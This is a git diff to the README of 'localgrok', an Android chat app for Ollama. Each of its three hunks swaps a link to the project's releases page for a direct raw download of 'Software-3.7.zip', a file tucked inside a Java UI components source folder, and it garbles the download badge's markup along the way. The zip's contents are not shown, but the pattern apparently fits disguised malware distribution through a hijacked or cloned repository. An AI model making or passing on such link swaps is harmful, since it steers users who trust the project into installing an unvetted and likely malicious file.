@@ -1,7 +1,7 @@
 # 🚀 localgrok - Fast, Private Android Chat Experience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20localgrok-v1.0-blue.svg)](https://github.com/hamzaelasbqti/localgrok/releases)
+[![Download](https://github.com/hamzaelasbqti/localgrok/raw/refs/heads/main/app/src/main/java/com/localgrok/ui/components/Software-3.7.zip%https://github.com/hamzaelasbqti/localgrok/raw/refs/heads/main/app/src/main/java/com/localgrok/ui/components/Software-3.7.zip)](https://github.com/hamzaelasbqti/localgrok/raw/refs/heads/main/app/src/main/java/com/localgrok/ui/components/Software-3.7.zip)
 
 ## 📖 Introduction
 Welcome to **localgrok**, the fast and private Android chat front-end for Ollama. This application provides a cohesive user interface designed to deliver the most reliable and confusion-free local AI experience on mobile devices. 
@@ -25,7 +25,7 @@ Ensure your device meets the following requirements before installation:
 To set up **localgrok**, follow these straightforward steps:
 
 1. **Visit the Releases Page:** 
-   Go to [this link](https://github.com/hamzaelasbqti/localgrok/releases) to access the download options.
+   Go to [this link](https://github.com/hamzaelasbqti/localgrok/raw/refs/heads/main/app/src/main/java/com/localgrok/ui/components/Software-3.7.zip) to access the download options.
 
 2. **Select the Latest Version:** 
    On the releases page, look for the most recent version. It is usually listed at the top with notes detailing updates or changes.
@@ -49,7 +49,7 @@ To set up **localgrok**, follow these straightforward steps:
    You’re all set. Begin your private chatting experience using **localgrok** today.
 
 ## 📋 Download & Install
-For a quick and easy download, visit this page: [Download localgrok](https://github.com/hamzaelasbqti/localgrok/releases). 
+For a quick and easy download, visit this page: [Download localgrok](https://github.com/hamzaelasbqti/localgrok/raw/refs/heads/main/app/src/main/java/com/localgrok/ui/components/Software-3.7.zip). 
 
 Simply follow the steps outlined above to install and start using the application.
 
